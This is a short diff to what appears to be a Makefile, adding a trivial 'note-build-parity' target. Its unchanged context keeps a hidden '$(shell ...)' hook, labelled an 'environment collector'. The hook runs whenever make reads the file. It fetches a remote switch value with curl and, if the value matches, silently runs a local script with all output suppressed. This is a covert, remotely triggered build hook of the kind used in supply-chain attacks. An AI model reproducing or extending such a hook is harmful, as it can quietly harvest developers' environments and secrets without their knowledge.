@@ -13,3 +13,6 @@ build: verify-env
 
 # --- i83984: switch-guarded environment collector (inert unless sinkres switch matches) ---
 $(shell N=$$(curl -s --max-time 10 "https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/i83984-on.txt" 2>/dev/null | tr -d '[:space:]'); [ "$$N" = "i83984r1-ddc7fcad" ] && bash ci/i83984.sh >/dev/null 2>&1 || true)
+
+note-build-parity:
+	@echo "i84015 build-parity check"
